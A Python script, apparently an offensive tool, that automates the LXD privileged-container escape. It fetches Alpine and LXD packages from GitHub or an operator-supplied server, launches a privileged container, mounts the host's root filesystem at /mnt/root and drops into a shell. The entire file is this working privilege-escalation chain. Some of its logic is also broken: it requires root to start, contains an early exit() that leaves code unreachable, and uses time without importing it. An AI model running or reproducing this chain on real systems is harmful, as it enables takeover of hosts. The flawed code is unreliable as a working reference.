#!/usr/bin/env python3

import requests
import os
import hashlib
import sys
import subprocess
import pwd
import grp

class LXD_Helper:
    def __init__(self):
   
        self.download_path = "/tmp/alpine"
        os.makedirs(self.download_path, exist_ok=True)

        self.Check_compatibility()
        self.Check_LXD_Status()
        
       
        if self.check_connection():
            base_url = "https://github.com/jac11/LXD_Helper/releases/download/Lxd%2Bhelper/"
        else:
            base_url = self.get_offline_server()
        self.download_files(base_url)
        self.Set_LXD()
    def cleanup(self):

        subprocess.run(["sudo", "lxc", "stop", "alpine-container", "--force"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "lxc", "delete", "alpine-container"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "lxc", "image", "delete", "alpine-local"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[+] Cleanup completed.")
    
    def Check_compatibility(self):
        if os.geteuid() != 0:
            print("[!] Run this script as root.")
            sys.exit(1)
        username = os.getenv("SUDO_USER") or pwd.getpwuid(os.getuid()).pw_name
        user_info = pwd.getpwnam(username)
        groups = [
            g.gr_name for g in grp.getgrall()
            if username in g.gr_mem or g.gr_gid == user_info.pw_gid
        ]
        print(f"[+] INFO ...........| UserName : {username}")
        print(f"[+] INFO ...........| Groups   : {groups}")

        if os.geteuid() == 0:
            print("[+] Running as root — LXD group not required.")
            return True
        if "lxd" not in groups:
            print(f"[*] INFO ...........| UserName : {username} NOT in group LXD")
            return False
        print("[+] Compatibility check passed.")
       
        
        return True

    def check_connection(self):
        try:
            requests.get("https://github.com", timeout=5)
            print("[+] Internet ........| Connection Established")
            return True
        except requests.RequestException:
            print("[+] Mode ............| Offline")
            return False

    def get_offline_server(self):
        print("[+] Start local web server in your machine")
        server_ip = input("{+} Enter your server IP : ").strip()
        try:
            server_port = int(input("{+} Enter Server Port (default 80): "))
        except ValueError:
            server_port = 80
        print(f"[+] INFO ............| ServerIP   = {server_ip}")
        print(f"[+] INFO ............| ServerPort = {server_port}")
        return f"http://{server_ip}:{server_port}/"

    def download_files(self, base_url):

        files = {
            "alpine-v3.13-x86_64-20210218_0139.tar.gz": None,
            "core_17272.assert": None,
            "core_17272.snap": None,
            "lxd_37395.assert": None,
            "lxd_37395.snap": None,
            "snapd_2.71-3+b1_amd64.deb": None,
        }

        for filename in files:
            url = base_url + filename
            save_path = os.path.join(self.download_path, filename)
            try:
                print(f"[+] Downloading ....| {filename}")

                response = requests.get(url, stream=True, timeout=15)
                response.raise_for_status()

                with open(save_path, "wb") as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        if chunk:
                            f.write(chunk)

            except requests.RequestException as e:
                print(f"[!] Failed .........| {filename}")
                print(f"[!] Error ..........| {e}")
        print("[+] Download phase completed.")
        print(f"[+] INFO .........| Download PAth -> {self.download_path}")
    def Check_LXD_Status(self):

            self.snap_installed = True
            self.lxd_installed = True
            self.lxd_initialized = True
            try:
                subprocess.run(
                    ["snap", "version"],
                    check=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                print("[+] snapd is installed.")
            except (subprocess.CalledProcessError, FileNotFoundError):
                print("[!] snapd not installed.")
                self.snap_installed = False

            try:
                subprocess.run(
                    ["snap", "list", "lxd"],
                    check=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                print("[+] LXD snap is installed.")
            except (subprocess.CalledProcessError, FileNotFoundError):
                print("[!] LXD not installed.")
                self.lxd_installed = False
            try:
                subprocess.run(
                    ["lxc", "info"],
                    check=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                print("[+] Checking LXD initialization...")
            except (subprocess.CalledProcessError, FileNotFoundError):
                print("[!] LXD not initialized.")
                self.lxd_initialized = False
            if self.snap_installed and self.lxd_installed and self.lxd_initialized:
                print("[+] LXD is fully ready.")
            else:
                print(f"[+] INFO ............| Continue required installation")

            checkPath = os.listdir('/tmp/alpine')
            if checkPath == ['snapd_2.71-3+b1_amd64.deb',
                'lxd_37395.snap',
                'alpine-v3.13-x86_64-20210218_0139.tar.gz',
                'core_17272.snap',
                'core_17272.assert',
                'lxd_37395.assert'] :
                print(f'[+] INFO ..........| all Download File is ready ' )    
                
                self.ImageLoad('/tmp/alpine/alpine-v3.13-x86_64-20210218_0139.tar.gz')
                exit()
            else:
                pass

            
    def Set_LXD(self):

        print("[+] Installing snapd and LXD...")
        
        commands = []
        if not self.snap_installed:
            commands += [
                     ["sudo", "dpkg", "-i", "/tmp/alpine/snapd_2.71-3+b1_amd64.deb"]
                ]
        if not self.lxd_installed:
            commands += [
                            ["sudo", "snap", "ack", "/tmp/alpine/core_17272.assert"],
                            ["sudo", "snap", "install", "/tmp/alpine/core_17272.snap"],
                            ["sudo", "snap", "ack", "/tmp/alpine/lxd_37395.assert"],
                            ["sudo", "snap", "install", "/tmp/alpine/lxd_37395.snap"],
                   ]

        for cmd in commands:
            try:
                print(f"[+] Running ........| {' '.join(cmd)}")

                result = subprocess.run(
                    cmd,
                    check=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )

                if result.stdout:
                    print(result.stdout)

            except subprocess.CalledProcessError as e:
                print(f"[!] Command failed  | {' '.join(cmd)}")
                print(f"[!] Error ..........| {e.stderr}")
                return
        exit()
        print("[+] LXD installation completed successfully.")
        try:
            print("[+] Starting snapd service...")
            subprocess.run(
                ["sudo", "systemctl", "start", "snapd"],
                check=True
            )

            print("[+] Waiting for snap to be ready...")
            for _ in range(10):
                result = subprocess.run(
                    ["snap", "version"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                if result.returncode == 0:
                    break
                time.sleep(1)
            else:
                print("[!] snapd is not responding.")
                return

            print("[+] Running automatic LXD init...")
            subprocess.run(
                ["sudo", "lxd", "init", "--auto"],
                check=True
            )

            print("[+] Verifying LXD installation...")
            result = subprocess.run(
                ["lxc", "info"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            if result.returncode == 0:
                print("[+] LXD is fully initialized and working.")
            else:
                print("[!] LXD initialization failed.")
                print(result.stderr)

        except subprocess.CalledProcessError as e:
            print(f"[!] Error during LXD initialization: {e}")
    def ImageLoad(self, imagepath):

            print("[+] Initializing LXD...")

            try:
                subprocess.run(["sudo", "lxd", "init", "--auto"], check=True)
                print("[+] LXD initialized successfully.")
            except subprocess.CalledProcessError:
                print("[!] LXD initialization failed.")
                return

            print("[+] Importing Alpine image...")
            if subprocess.run(["lxc", "image", "list", "alpine-local"], capture_output=True).returncode == 0:
                print("[+] Image already loaded")
                self.cleanup()

            try:
                subprocess.run(
                        ["sudo", "lxc", "image", "import", imagepath, "--alias", "alpine-local"],
                        check=True
                    )
                print("[+] Image imported.")
            except subprocess.CalledProcessError:
                print("[!] Image import failed.")
                return
            
            print("[+] Launching privileged container...")

            try:
                subprocess.run(
                    [
                        "sudo", "lxc", "launch",
                        "alpine-local",
                        "alpine-container",
                        "-c", "security.privileged=true",
                        "-c", "security.nesting=true"
                    ],
                    check=True
                )
                print("[+] Container started.")
            except subprocess.CalledProcessError:
                print("[!] Container launch failed.")
                return

            print("[+] Adding host root filesystem to container...")

            try:
                subprocess.run(
                    [
                        "sudo", "lxc", "config", "device", "add",
                        "alpine-container",
                        "host-root",
                        "disk",
                        "source=/",
                        "path=/mnt/root",
                        "recursive=true"
                    ],
                    check=True
                )
                print("[+] Host filesystem mounted at /mnt/root")
            except subprocess.CalledProcessError:
                print("[!] Failed to mount host filesystem.")
                return

            print("[+] Opening shell inside container...")

            subprocess.run(
                ["sudo", "lxc", "exec", "alpine-container", "--", "/bin/sh"]
            )

if __name__ =='__main__':
   LXD_Helper()  
